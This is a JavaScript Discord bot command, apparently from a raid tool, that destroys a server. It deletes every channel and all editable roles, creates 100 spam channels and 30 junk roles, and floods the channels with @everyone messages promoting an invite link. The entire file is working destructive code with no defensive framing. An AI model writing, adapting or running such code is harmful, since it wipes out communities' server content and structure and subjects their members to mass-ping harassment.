const { SlashCommandBuilder, MessageFlags } = require('discord.js');
const colors = require('colors');

module.exports = {
  data: new SlashCommandBuilder()
    .setName('raid')
    .setDescription('Destruye el servidor'),

  async execute(interaction) {
    await interaction.deferReply({ flags: MessageFlags.Ephemeral });
    const startTime = Date.now();

    try {
      // 1) Eliminación de canales
      console.log('[/] deleting channels...'.yellow);
      const channels = interaction.guild.channels.cache;
      await Promise.all(
        channels.map(channel =>
          channel.delete().catch(e => console.error(`[-] error deleting channel: ${e.message}`.red))
        )
      );
      console.log('[+] deleted channels'.green);

      // 2) Creación de 100 canales de raid
      console.log('[/] creating channels...'.yellow);
      const raidChannels = await Promise.all(
        Array.from({ length: 100 }, () =>
          interaction.guild.channels.create({
            name: 'raid-ez',
            type: 0,
          }).catch(e => {
            console.error(`[-] error creating channel: ${e.message}`.red);
            return null;
          })
        )
      );
      const validRaidChannels = raidChannels.filter(ch => ch !== null);

      // 3) Envío masivo de mensajes
      console.log('[/] sending messages...'.yellow);
      const raidMessage = 'raid-by-devbloqueado\ndiscord.gg/devbloqueado\n\n@everyone';
      await Promise.all(
        validRaidChannels.map(channel =>
          Promise.all(
            Array.from({ length: 20 }, () =>
              channel.send(raidMessage).catch(e => console.error(`[-] error sending message: ${e.message}`.red))
            )
          )
        )
      );
      console.log('[+] messages sent'.green);

      // 4) Eliminación de roles
      console.log('[/] eliminating roles...'.yellow);
      const roles = interaction.guild.roles.cache;
      const deletableRoles = roles.filter(role =>
        !role.managed && role.editable && role.id !== interaction.guild.roles.everyone.id
      );
      await Promise.all(
        deletableRoles.map(role =>
          role.delete().catch(e => console.error(`[-] error deleting role: ${e.message}`.red))
        )
      );
      console.log('[+] deleted roles'.green);

      // 5) Creación de 30 nuevos roles
      console.log('[/] creating new roles (30)'.yellow);
      await Promise.all(
        Array.from({ length: 30 }, () =>
          interaction.guild.roles.create({
            name: 'dev@bloqueado',
            color: 0xFF0000,
          }).catch(e => {
            console.error(`[-] error creating role: ${e.message}`.red);
            return null;
          })
        )
      );
      console.log('[+] created new roles'.green);
      
      const endTime = Date.now();
      const elapsedSeconds = ((endTime - startTime) / 1000).toFixed(2);
      console.log(`[+] filled! in ${elapsedSeconds}s`.green);

    } catch (error) {
      console.log('[*] critical error:'.red.underline, error.message);
    }
  }
};
